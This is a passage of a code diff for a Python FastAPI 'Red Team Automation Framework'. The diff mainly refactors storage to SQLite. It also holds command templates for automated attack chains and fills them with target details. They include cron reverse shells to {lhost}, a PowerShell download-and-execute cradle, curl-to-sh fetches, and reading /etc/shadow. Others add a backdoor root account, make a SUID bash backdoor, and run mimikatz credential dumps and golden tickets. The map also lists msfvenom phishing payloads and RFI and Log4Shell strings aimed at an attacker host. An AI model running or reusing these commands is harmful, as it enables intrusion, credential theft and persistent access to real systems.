@@ -1,12 +1,10 @@
 from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, WebSocket, WebSocketDisconnect
 from fastapi.responses import StreamingResponse
-from dotenv import load_dotenv
 from starlette.middleware.cors import CORSMiddleware
-from motor.motor_asyncio import AsyncIOMotorClient
 import os
 import logging
 from pathlib import Path
-from pydantic import BaseModel, ConfigDict
+from pydantic import BaseModel
 from typing import List, Optional, Dict, Any
 import uuid
 from datetime import datetime, timezone
@@ -16,21 +14,13 @@ import json
 import re
 import io
 import asyncio
+import time
 from fpdf import FPDF
 
-ROOT_DIR = Path(__file__).parent
-load_dotenv(ROOT_DIR / '.env')  # Local dev; Docker uses env_file from compose
-
-mongo_url = os.environ.get('MONGO_URL', 'mongodb://localhost:27017')
-client = AsyncIOMotorClient(mongo_url)
-db = client[os.environ.get('DB_NAME', 'redteam_framework')]
-
-KIMI_API_KEY = os.environ.get('KIMI_API_KEY', '')
-KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"
-MSF_RPC_TOKEN = os.environ.get('MSF_RPC_TOKEN', '')
-MSF_RPC_HOST = os.environ.get('MSF_RPC_HOST', '127.0.0.1')
-MSF_RPC_PORT = int(os.environ.get('MSF_RPC_PORT', '55553'))
-SLIVER_CONFIG_PATH = os.environ.get('SLIVER_CONFIG_PATH', '')
+# Local modules — SQLite-based persistence
+from config import config
+import db as repo
+import jobs
 
 app = FastAPI(title="Red Team Automation Framework")
 api_router = APIRouter(prefix="/api")
@@ -38,314 +28,217 @@ api_router = APIRouter(prefix="/api")
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# In-memory state for real-time tracking during active operations
 scan_progress: Dict[str, Dict[str, Any]] = {}
 attack_trees: Dict[str, Dict[str, Any]] = {}
 active_connections: Dict[str, List[WebSocket]] = {}
 active_chains: Dict[str, Dict[str, Any]] = {}
 
+# Config values from config.py
+KIMI_API_KEY = config.kimi_api_key
+KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"
+MSF_RPC_TOKEN = config.msf_rpc_token
+MSF_RPC_HOST = config.msf_rpc_host
+MSF_RPC_PORT = config.msf_rpc_port
+SLIVER_CONFIG_PATH = config.sliver_config_path
+
+
 # =============================================================================
 # ATTACK CHAINS - AUTOMATED EXPLOITATION SEQUENCES
 # =============================================================================
 class AttackChainEngine:
-    """
-    Motor de cadenas de ataque automatizadas.
-    Ejecuta secuencias de exploits basadas en hallazgos.
-    """
-    
-    # Predefined attack chains
     ATTACK_CHAINS = {
         "web_to_shell": {
             "name": "Web App to Shell",
-            "description": "SQLi/RCE → Credential Dump → Persistence",
+            "description": "SQLi/RCE -> Credential Dump -> Persistence",
             "trigger": ["sql injection", "rce", "command injection"],
             "steps": [
-                {
-                    "id": 1, "name": "Initial Exploitation",
-                    "actions": [
-                        {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --os-shell --batch", "condition": "sqli"},
-                        {"tool": "commix", "cmd": "commix -u '{url}' --os-cmd='id'", "condition": "cmdi"}
-                    ]
-                },
-                {
-                    "id": 2, "name": "Credential Harvesting",
-                    "actions": [
-                        {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --passwords --batch", "condition": "sqli"},
-                        {"cmd": "cat /etc/passwd; cat /etc/shadow 2>/dev/null", "condition": "shell"}
-                    ]
-                },
-                {
-                    "id": 3, "name": "Privilege Escalation Check",
-                    "actions": [
-                        {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "condition": "linux"},
-                        {"tool": "winpeas", "cmd": "winPEASx64.exe", "condition": "windows"}
-                    ]
-                },
-                {
-                    "id": 4, "name": "Establish Persistence",
-                    "actions": [
-                        {"cmd": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' | crontab -", "condition": "linux"},
-                        {"cmd": "schtasks /create /tn 'Update' /tr 'powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\"http://{lhost}:{lport}/shell.ps1\"))' /sc minute", "condition": "windows"}
-                    ]
-                }
+                {"id": 1, "name": "Initial Exploitation", "actions": [
+                    {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --os-shell --batch", "condition": "sqli"},
+                    {"tool": "commix", "cmd": "commix -u '{url}' --os-cmd='id'", "condition": "cmdi"}
+                ]},
+                {"id": 2, "name": "Credential Harvesting", "actions": [
+                    {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --passwords --batch", "condition": "sqli"},
+                    {"cmd": "cat /etc/passwd; cat /etc/shadow 2>/dev/null", "condition": "shell"}
+                ]},
+                {"id": 3, "name": "Privilege Escalation Check", "actions": [
+                    {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "condition": "linux"},
+                    {"tool": "winpeas", "cmd": "winPEASx64.exe", "condition": "windows"}
+                ]},
+                {"id": 4, "name": "Establish Persistence", "actions": [
+                    {"cmd": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' | crontab -", "condition": "linux"},
+                    {"cmd": "schtasks /create /tn 'Update' /tr 'powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\"http://{lhost}:{lport}/shell.ps1\"))' /sc minute", "condition": "windows"}
+                ]}
             ]
         },
         "smb_to_domain": {
             "name": "SMB to Domain Admin",
-            "description": "EternalBlue/Creds → Hashdump → Lateral → DC",
+            "description": "EternalBlue/Creds -> Hashdump -> Lateral -> DC",
             "trigger": ["smb", "445", "ms17-010"],
             "steps": [
-                {
-                    "id": 1, "name": "SMB Exploitation",
-                    "actions": [
-                        {"tool": "metasploit", "module": "exploit/windows/smb/ms17_010_eternalblue", "condition": "ms17-010"},
-                        {"tool": "crackmapexec", "cmd": "crackmapexec smb {target} -u '' -p ''", "condition": "smb"}
-                    ]
-                },
-                {
-                    "id": 2, "name": "Credential Dump",
-                    "actions": [
-                        {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
-                        {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{user}:{pass}@{target}"}
-                    ]
-                },
-                {
-                    "id": 3, "name": "Lateral Movement",
-                    "actions": [
-                        {"tool": "psexec", "cmd": "psexec.py {domain}/{user}:{pass}@{next_target}"},
-                        {"tool": "wmiexec", "cmd": "wmiexec.py {domain}/{user}:{pass}@{next_target}"},
-                        {"tool": "crackmapexec", "cmd": "crackmapexec smb {subnet} -u {user} -p {pass} --sam"}
-                    ]
-                },
-                {
-                    "id": 4, "name": "Domain Controller Compromise",
-                    "actions": [
-                        {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{admin}:{pass}@{dc} -just-dc"},
-                        {"tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"}
-                    ]
-                }
+                {"id": 1, "name": "SMB Exploitation", "actions": [
+                    {"tool": "metasploit", "module": "exploit/windows/smb/ms17_010_eternalblue", "condition": "ms17-010"},
+                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {target} -u '' -p ''", "condition": "smb"}
+                ]},
+                {"id": 2, "name": "Credential Dump", "actions": [
+                    {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
+                    {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{user}:{pass}@{target}"}
+                ]},
+                {"id": 3, "name": "Lateral Movement", "actions": [
+                    {"tool": "psexec", "cmd": "psexec.py {domain}/{user}:{pass}@{next_target}"},
+                    {"tool": "wmiexec", "cmd": "wmiexec.py {domain}/{user}:{pass}@{next_target}"},
+                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {subnet} -u {user} -p {pass} --sam"}
+                ]},
+                {"id": 4, "name": "Domain Controller Compromise", "actions": [
+                    {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{admin}:{pass}@{dc} -just-dc"},
+                    {"tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"}
+                ]}
             ]
         },
         "kerberos_attack": {
             "name": "Kerberos Attack Chain",
-            "description": "User Enum → AS-REP → Kerberoast → Golden Ticket",
+            "description": "User Enum -> AS-REP -> Kerberoast -> Golden Ticket",
             "trigger": ["kerberos", "88", "active directory"],
             "steps": [
-                {
-                    "id": 1, "name": "User Enumeration",
-                    "actions": [
-                        {"tool": "kerbrute", "cmd": "kerbrute userenum -d {domain} users.txt --dc {dc}"},
-                        {"tool": "crackmapexec", "cmd": "crackmapexec ldap {dc} -u '' -p '' --users"}
-                    ]
-                },
-                {
-                    "id": 2, "name": "AS-REP Roasting",
-                    "actions": [
-                        {"tool": "impacket", "cmd": "GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}"},
-                        {"tool": "rubeus", "cmd": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"}
-                    ]
-                },
-                {
-                    "id": 3, "name": "Kerberoasting",
-                    "actions": [
-                        {"tool": "impacket", "cmd": "GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {dc} -request"},
-                        {"tool": "rubeus", "cmd": "Rubeus.exe kerberoast /outfile:kerberoast.txt"}
-                    ]
-                },
-                {
-                    "id": 4, "name": "Crack Hashes",
-                    "actions": [
-                        {"tool": "hashcat", "cmd": "hashcat -m 18200 asrep.txt wordlist.txt"},
-                        {"tool": "hashcat", "cmd": "hashcat -m 13100 kerberoast.txt wordlist.txt"}
-                    ]
-                },
-                {
-                    "id": 5, "name": "Golden Ticket",
-                    "actions": [
-                        {"tool": "mimikatz", "cmd": "kerberos::golden /user:Administrator /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt"},
-                        {"tool": "impacket", "cmd": "ticketer.py -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator"}
-                    ]
-                }
+                {"id": 1, "name": "User Enumeration", "actions": [
+                    {"tool": "kerbrute", "cmd": "kerbrute userenum -d {domain} users.txt --dc {dc}"},
+                    {"tool": "crackmapexec", "cmd": "crackmapexec ldap {dc} -u '' -p '' --users"}
+                ]},
+                {"id": 2, "name": "AS-REP Roasting", "actions": [
+                    {"tool": "impacket", "cmd": "GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}"},
+                    {"tool": "rubeus", "cmd": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"}
+                ]},
+                {"id": 3, "name": "Kerberoasting", "actions": [
+                    {"tool": "impacket", "cmd": "GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {dc} -request"},
+                    {"tool": "rubeus", "cmd": "Rubeus.exe kerberoast /outfile:kerberoast.txt"}
+                ]},
+                {"id": 4, "name": "Crack Hashes", "actions": [
+                    {"tool": "hashcat", "cmd": "hashcat -m 18200 asrep.txt wordlist.txt"},
+                    {"tool": "hashcat", "cmd": "hashcat -m 13100 kerberoast.txt wordlist.txt"}
+                ]},
+                {"id": 5, "name": "Golden Ticket", "actions": [
+                    {"tool": "mimikatz", "cmd": "kerberos::golden /user:Administrator /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt"},
+                    {"tool": "impacket", "cmd": "ticketer.py -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator"}
+                ]}
             ]
         },
         "linux_privesc": {
             "name": "Linux Privilege Escalation",
-            "description": "Shell → Enum → Exploit → Root",
+            "description": "Shell -> Enum -> Exploit -> Root",
             "trigger": ["linux", "shell", "ssh"],
             "steps": [
-                {
-                    "id": 1, "name": "System Enumeration",
-                    "actions": [
-                        {"cmd": "uname -a; cat /etc/*release*"},
-                        {"cmd": "id; sudo -l 2>/dev/null"},
-                        {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"}
-                    ]
-                },
-                {
-                    "id": 2, "name": "SUID/Capabilities Check",
-                    "actions": [
-                        {"cmd": "find / -perm -4000 -type f 2>/dev/null"},
-                        {"cmd": "getcap -r / 2>/dev/null"}
-                    ]
-                },
-                {
-                    "id": 3, "name": "Kernel Exploit",
-                    "actions": [
-                        {"tool": "linux-exploit-suggester", "cmd": "./linux-exploit-suggester.sh"},
-                        {"tool": "metasploit", "module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "condition": "polkit"},
-                        {"tool": "metasploit", "module": "exploit/linux/local/cve_2022_0847_dirtypipe", "condition": "kernel>=5.8"}
-                    ]
-                },
-                {
-                    "id": 4, "name": "Root Persistence",
-                    "actions": [
-                        {"cmd": "echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"},
-                        {"cmd": "cp /bin/bash /tmp/.backdoor; chmod +s /tmp/.backdoor"}
-                    ]
-                }
+                {"id": 1, "name": "System Enumeration", "actions": [
+                    {"cmd": "uname -a; cat /etc/*release*"},
+                    {"cmd": "id; sudo -l 2>/dev/null"},
+                    {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"}
+                ]},
+                {"id": 2, "name": "SUID/Capabilities Check", "actions": [
+                    {"cmd": "find / -perm -4000 -type f 2>/dev/null"},
+                    {"cmd": "getcap -r / 2>/dev/null"}
+                ]},
+                {"id": 3, "name": "Kernel Exploit", "actions": [
+                    {"tool": "linux-exploit-suggester", "cmd": "./linux-exploit-suggester.sh"},
+                    {"tool": "metasploit", "module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "condition": "polkit"},
+                    {"tool": "metasploit", "module": "exploit/linux/local/cve_2022_0847_dirtypipe", "condition": "kernel>=5.8"}
+                ]},
+                {"id": 4, "name": "Root Persistence", "actions": [
+                    {"cmd": "echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"},
+                    {"cmd": "cp /bin/bash /tmp/.backdoor; chmod +s /tmp/.backdoor"}
+                ]}
             ]
         },
         "windows_privesc": {
-            "name": "Windows Privilege Escalation", 
-            "description": "Shell → Enum → Exploit → SYSTEM",
+            "name": "Windows Privilege Escalation",
+            "description": "Shell -> Enum -> Exploit -> SYSTEM",
             "trigger": ["windows", "shell", "rdp", "winrm"],
             "steps": [
-                {
-                    "id": 1, "name": "System Enumeration",
-                    "actions": [
-                        {"cmd": "systeminfo"},
-                        {"cmd": "whoami /priv"},
-                        {"tool": "winpeas", "cmd": "winPEASx64.exe"}
-                    ]
-                },
-                {
-                    "id": 2, "name": "Service/Scheduled Task Abuse",
-                    "actions": [
-                        {"cmd": "sc qc vulnerable_service"},
-                        {"tool": "powerup", "cmd": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\""}
-                    ]
-                },
-                {
-                    "id": 3, "name": "Token Impersonation",
-                    "actions": [
-                        {"tool": "incognito", "cmd": "incognito.exe list_tokens -u"},
-                        {"tool": "metasploit", "module": "post/windows/manage/migrate"}
-                    ]
-                },
-                {
-                    "id": 4, "name": "Credential Extraction",
-                    "actions": [
-                        {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
-                        {"tool": "metasploit", "module": "post/windows/gather/hashdump"}
-                    ]
-                }
+                {"id": 1, "name": "System Enumeration", "actions": [
+                    {"cmd": "systeminfo"}, {"cmd": "whoami /priv"},
+                    {"tool": "winpeas", "cmd": "winPEASx64.exe"}
+                ]},
+                {"id": 2, "name": "Service/Scheduled Task Abuse", "actions": [
+                    {"cmd": "sc qc vulnerable_service"},
+                    {"tool": "powerup", "cmd": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\""}
+                ]},
+                {"id": 3, "name": "Token Impersonation", "actions": [
+                    {"tool": "incognito", "cmd": "incognito.exe list_tokens -u"},
+                    {"tool": "metasploit", "module": "post/windows/manage/migrate"}
+                ]},
+                {"id": 4, "name": "Credential Extraction", "actions": [
+                    {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
+                    {"tool": "metasploit", "module": "post/windows/gather/hashdump"}
+                ]}
             ]
         },
         "phishing_to_shell": {
             "name": "Phishing to Internal Access",
-            "description": "Phish → Macro → Beacon → Pivot",
+            "description": "Phish -> Macro -> Beacon -> Pivot",
             "trigger": ["phishing", "email", "social"],
             "steps": [
-                {
-                    "id": 1, "name": "Payload Generation",
-                    "actions": [
-                        {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f exe > payload.exe"},
-                        {"tool": "macro_pack", "cmd": "echo 'payload' | macro_pack.py -t DROPPER -o mal.docm"}
-                    ]
-                },
-                {
-                    "id": 2, "name": "Delivery",
-                    "actions": [
-                        {"tool": "gophish", "cmd": "Launch phishing campaign with mal.docm attachment"},
-                        {"tool": "evilginx2", "cmd": "Setup credential harvesting proxy"}
-                    ]
-                },
-                {
-                    "id": 3, "name": "Initial Beacon",
-                    "actions": [
-                        {"tool": "metasploit", "cmd": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https"},
-                        {"cmd": "Wait for callback from victim"}
-                    ]
-                },
-                {
-                    "id": 4, "name": "Internal Recon & Pivot",
-                    "actions": [
-                        {"cmd": "arp -a; netstat -an; ipconfig /all"},
-                        {"tool": "chisel", "cmd": "chisel server -p 8080 --reverse (on attack box: {lhost})"},
-                        {"cmd": "chisel client {lhost}:8080 R:socks"}
-                    ]
-                }
+                {"id": 1, "name": "Payload Generation", "actions": [
+                    {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f exe > payload.exe"},
+                    {"tool": "macro_pack", "cmd": "echo 'payload' | macro_pack.py -t DROPPER -o mal.docm"}
+                ]},
+                {"id": 2, "name": "Delivery", "actions": [
+                    {"tool": "gophish", "cmd": "Launch phishing campaign with mal.docm attachment"},
+                    {"tool": "evilginx2", "cmd": "Setup credential harvesting proxy"}
+                ]},
+                {"id": 3, "name": "Initial Beacon", "actions": [
+                    {"tool": "metasploit", "cmd": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https"},
+                    {"cmd": "Wait for callback from victim"}
+                ]},
+                {"id": 4, "name": "Internal Recon & Pivot", "actions": [
+                    {"cmd": "arp -a; netstat -an; ipconfig /all"},
+                    {"tool": "chisel", "cmd": "chisel server -p 8080 --reverse (on attack box: {lhost})"},
+                    {"cmd": "chisel client {lhost}:8080 R:socks"}
+                ]}
             ]
         }
     }
-    
+
     @classmethod
     def get_applicable_chains(cls, findings: Dict) -> List[Dict]:
-        """Identify which attack chains apply based on findings"""
         applicable = []
         findings_text = json.dumps(findings).lower()
-        
         for chain_id, chain in cls.ATTACK_CHAINS.items():
             for trigger in chain["trigger"]:
                 if trigger.lower() in findings_text:
                     applicable.append({
-                        "id": chain_id,
-                        "name": chain["name"],
-                        "description": chain["description"],
-                        "trigger_matched": trigger,
-                        "steps": chain["steps"],
-                        "total_steps": len(chain["steps"])
+                        "id": chain_id, "name": chain["name"],
+                        "description": chain["description"], "trigger_matched": trigger,
+                        "steps": chain["steps"], "total_steps": len(chain["steps"])
                     })
                     break
-        
         return applicable
-    
+
     @classmethod
     def get_chain_details(cls, chain_id: str) -> Optional[Dict]:
-        """Get full details of an attack chain"""
         return cls.ATTACK_CHAINS.get(chain_id)
-    
+
     @classmethod
     def generate_chain_commands(cls, chain_id: str, context: Dict) -> List[Dict]:
-        """Generate executable commands for a chain with context"""
         chain = cls.ATTACK_CHAINS.get(chain_id)
         if not chain:
             return []
-        
         commands = []
         for step in chain["steps"]:
             step_commands = []
             for action in step["actions"]:
                 cmd = action.get("cmd", "")
-                # Replace placeholders
                 for key, value in context.items():
                     cmd = cmd.replace(f"{{{key}}}", str(value))
-                
                 step_commands.append({
-                    "tool": action.get("tool", "shell"),
-                    "command": cmd,
-                    "module": action.get("module"),
-                    "condition": action.get("condition")
+                    "tool": action.get("tool", "shell"), "command": cmd,
+                    "module": action.get("module"), "condition": action.get("condition")
                 })
-            
-            commands.append({
-                "step_id": step["id"],
-                "step_name": step["name"],
-                "commands": step_commands
-            })
-        
+            commands.append({"step_id": step["id"], "step_name": step["name"], "commands": step_commands})
         return commands
 
 
 # =============================================================================
-# TACTICAL DECISION ENGINE - ADAPTIVE ATTACK PLANNING
+# TACTICAL DECISION ENGINE
 # =============================================================================
 class TacticalDecisionEngine:
-    """
-    Motor de decisión táctica que adapta el plan de ataque en tiempo real
-    basado en los hallazgos durante la operación.
-    """
-    
-    # WAF Bypass strategies
     WAF_BYPASS_STRATEGIES = {
         "cloudflare": {
             "name": "Cloudflare",
@@ -399,361 +292,136 @@ class TacticalDecisionEngine:
             "alternative_approach": "Enumerate all subdomains, find unprotected endpoints"
         }
     }
-    
-    # Service-specific attack strategies
+
     SERVICE_ATTACK_MAP = {
-        "ssh": {
-            "22/tcp": ["hydra", "crackmapexec"],
-            "exploits": ["auxiliary/scanner/ssh/ssh_login", "exploit/linux/ssh/sshexec"],
-            "next_phase": "credential_access",
-            "decision": "SSH detected - attempt credential brute force or key-based auth"
-        },
-        "http": {
-            "80/tcp": ["nikto", "gobuster", "sqlmap"],
-            "443/tcp": ["nikto", "gobuster", "sqlmap", "sslscan"],
-            "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec", "auxiliary/scanner/http/dir_scanner"],
-            "next_phase": "initial_access",
-            "decision": "Web server detected - enumerate directories, check for vulns"
-        },
-        "smb": {
-            "445/tcp": ["crackmapexec", "enum4linux"],
-            "139/tcp": ["crackmapexec", "enum4linux"],
-            "exploits": ["exploit/windows/smb/ms17_010_eternalblue", "auxiliary/scanner/smb/smb_ms17_010"],
-            "next_phase": "initial_access",
-            "decision": "SMB detected - check for EternalBlue, null sessions"
-        },
-        "rdp": {
-            "3389/tcp": ["hydra", "ncrack"],
-            "exploits": ["auxiliary/scanner/rdp/rdp_scanner", "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"],
-            "next_phase": "initial_access",
-            "decision": "RDP detected - check BlueKeep, attempt credential attack"
-        },
-        "mysql": {
-            "3306/tcp": ["hydra", "mysql"],
-            "exploits": ["auxiliary/scanner/mysql/mysql_login"],
-            "next_phase": "credential_access",
-            "decision": "MySQL detected - attempt default creds, check for UDF exploitation"
-        },
-        "mssql": {
-            "1433/tcp": ["crackmapexec", "mssqlclient"],
-            "exploits": ["auxiliary/scanner/mssql/mssql_login", "exploit/windows/mssql/mssql_payload"],
-            "next_phase": "credential_access",
-            "decision": "MSSQL detected - xp_cmdshell potential, credential spray"
-        },
-        "ftp": {
-            "21/tcp": ["hydra", "nmap"],
-            "exploits": ["auxiliary/scanner/ftp/anonymous", "exploit/unix/ftp/vsftpd_234_backdoor"],
-            "next_phase": "initial_access",
-            "decision": "FTP detected - check anonymous access, version exploits"
-        },
-        "ldap": {
-            "389/tcp": ["ldapsearch", "windapsearch"],
-            "636/tcp": ["ldapsearch"],
-            "exploits": ["auxiliary/gather/ldap_query"],
-            "next_phase": "discovery",
-            "decision": "LDAP detected - enumerate AD, check for null bind"
-        },
-        "winrm": {
-            "5985/tcp": ["evil-winrm", "crackmapexec"],
-            "5986/tcp": ["evil-winrm"],
-            "exploits": ["auxiliary/scanner/winrm/winrm_login"],
-            "next_phase": "lateral_movement",
-            "decision": "WinRM detected - potential for lateral movement with creds"
-        },
-        "kerberos": {
-            "88/tcp": ["kerbrute", "impacket"],
-            "exploits": ["auxiliary/gather/kerberos_enumusers"],
-            "next_phase": "credential_access",
-            "decision": "Kerberos detected - AS-REP roasting, Kerberoasting possible"
-        }
+        "ssh": {"22/tcp": ["hydra", "crackmapexec"], "exploits": ["auxiliary/scanner/ssh/ssh_login", "exploit/linux/ssh/sshexec"], "next_phase": "credential_access", "decision": "SSH detected - attempt credential brute force or key-based auth"},
+        "http": {"80/tcp": ["nikto", "gobuster", "sqlmap"], "443/tcp": ["nikto", "gobuster", "sqlmap", "sslscan"], "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec", "auxiliary/scanner/http/dir_scanner"], "next_phase": "initial_access", "decision": "Web server detected - enumerate directories, check for vulns"},
+        "smb": {"445/tcp": ["crackmapexec", "enum4linux"], "139/tcp": ["crackmapexec", "enum4linux"], "exploits": ["exploit/windows/smb/ms17_010_eternalblue", "auxiliary/scanner/smb/smb_ms17_010"], "next_phase": "initial_access", "decision": "SMB detected - check for EternalBlue, null sessions"},
+        "rdp": {"3389/tcp": ["hydra", "ncrack"], "exploits": ["auxiliary/scanner/rdp/rdp_scanner", "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"], "next_phase": "initial_access", "decision": "RDP detected - check BlueKeep, attempt credential attack"},
+        "mysql": {"3306/tcp": ["hydra", "mysql"], "exploits": ["auxiliary/scanner/mysql/mysql_login"], "next_phase": "credential_access", "decision": "MySQL detected - attempt default creds, check for UDF exploitation"},
+        "mssql": {"1433/tcp": ["crackmapexec", "mssqlclient"], "exploits": ["auxiliary/scanner/mssql/mssql_login", "exploit/windows/mssql/mssql_payload"], "next_phase": "credential_access", "decision": "MSSQL detected - xp_cmdshell potential, credential spray"},
+        "ftp": {"21/tcp": ["hydra", "nmap"], "exploits": ["auxiliary/scanner/ftp/anonymous", "exploit/unix/ftp/vsftpd_234_backdoor"], "next_phase": "initial_access", "decision": "FTP detected - check anonymous access, version exploits"},
+        "ldap": {"389/tcp": ["ldapsearch", "windapsearch"], "636/tcp": ["ldapsearch"], "exploits": ["auxiliary/gather/ldap_query"], "next_phase": "discovery", "decision": "LDAP detected - enumerate AD, check for null bind"},
+        "winrm": {"5985/tcp": ["evil-winrm", "crackmapexec"], "5986/tcp": ["evil-winrm"], "exploits": ["auxiliary/scanner/winrm/winrm_login"], "next_phase": "lateral_movement", "decision": "WinRM detected - potential for lateral movement with creds"},
+        "kerberos": {"88/tcp": ["kerbrute", "impacket"], "exploits": ["auxiliary/gather/kerberos_enumusers"], "next_phase": "credential_access", "decision": "Kerberos detected - AS-REP roasting, Kerberoasting possible"},
     }
-    
-    # Vulnerability to exploit mapping
+
     VULN_EXPLOIT_MAP = {
-        "sql injection": {
-            "tools": ["sqlmap"],
-            "cmd": "sqlmap -u '{url}' --dbs --batch --random-agent",
-            "exploits": [],
-            "severity": "critical",
-            "next_action": "Dump database, look for credentials"
-        },
-        "xss": {
-            "tools": ["xsser", "dalfox"],
-            "cmd": "dalfox url '{url}' --blind your-server.com",
-            "exploits": [],
-            "severity": "high",
-            "next_action": "Attempt session hijacking, phishing"
-        },
-        "lfi": {
-            "tools": ["burp", "curl"],
-            "cmd": "curl '{url}?file=../../../etc/passwd'",
-            "exploits": ["exploit/unix/webapp/php_include"],
-            "severity": "critical",
-            "next_action": "Read /etc/passwd, attempt RCE via log poisoning"
-        },
-        "rfi": {
-            "tools": ["curl"],
-            "cmd": "curl '{url}?file=http://attacker/shell.php'",
-            "exploits": ["exploit/unix/webapp/php_include"],
-            "severity": "critical",
-            "next_action": "Host malicious PHP, get shell"
-        },
-        "command injection": {
-            "tools": ["commix", "burp"],
-            "cmd": "commix -u '{url}' --batch",
-            "exploits": [],
-            "severity": "critical",
-            "next_action": "Get reverse shell immediately"
-        },
-        "ssrf": {
-            "tools": ["burp", "ssrfmap"],
-            "cmd": "Try internal IPs: 127.0.0.1, 169.254.169.254 (AWS metadata)",
-            "exploits": [],
-            "severity": "high",
-            "next_action": "Access internal services, cloud metadata"
-        },
-        "shellshock": {
-            "tools": ["curl", "metasploit"],
-            "cmd": "curl -A '() { :;}; /bin/bash -c \"id\"' {url}",
-            "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec"],
-            "severity": "critical",
-            "next_action": "Immediate RCE possible"
-        },
-        "log4shell": {
-            "tools": ["log4j-scan", "metasploit"],
-            "cmd": "${jndi:ldap://attacker:1389/a}",
-            "exploits": ["exploit/multi/http/log4shell_header_injection"],
-            "severity": "critical",
-            "next_action": "Deploy JNDI callback server, get shell"
-        },
-        "eternalblue": {
-            "tools": ["metasploit"],
-            "cmd": "use exploit/windows/smb/ms17_010_eternalblue",
-            "exploits": ["exploit/windows/smb/ms17_010_eternalblue"],
-            "severity": "critical",
-            "next_action": "Direct RCE, SYSTEM shell"
-        }
+        "sql injection": {"tools": ["sqlmap"], "cmd": "sqlmap -u '{url}' --dbs --batch --random-agent", "exploits": [], "severity": "critical", "next_action": "Dump database, look for credentials"},
+        "xss": {"tools": ["xsser", "dalfox"], "cmd": "dalfox url '{url}' --blind your-server.com", "exploits": [], "severity": "high", "next_action": "Attempt session hijacking, phishing"},
+        "lfi": {"tools": ["burp", "curl"], "cmd": "curl '{url}?file=../../../etc/passwd'", "exploits": ["exploit/unix/webapp/php_include"], "severity": "critical", "next_action": "Read /etc/passwd, attempt RCE via log poisoning"},
+        "rfi": {"tools": ["curl"], "cmd": "curl '{url}?file=http://attacker/shell.php'", "exploits": ["exploit/unix/webapp/php_include"], "severity": "critical", "next_action": "Host malicious PHP, get shell"},
+        "command injection": {"tools": ["commix", "burp"], "cmd": "commix -u '{url}' --batch", "exploits": [], "severity": "critical", "next_action": "Get reverse shell immediately"},
+        "ssrf": {"tools": ["burp", "ssrfmap"], "cmd": "Try internal IPs: 127.0.0.1, 169.254.169.254 (AWS metadata)", "exploits": [], "severity": "high", "next_action": "Access internal services, cloud metadata"},
+        "shellshock": {"tools": ["curl", "metasploit"], "cmd": "curl -A '() {{ :;}}; /bin/bash -c \"id\"' {url}", "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec"], "severity": "critical", "next_action": "Immediate RCE possible"},
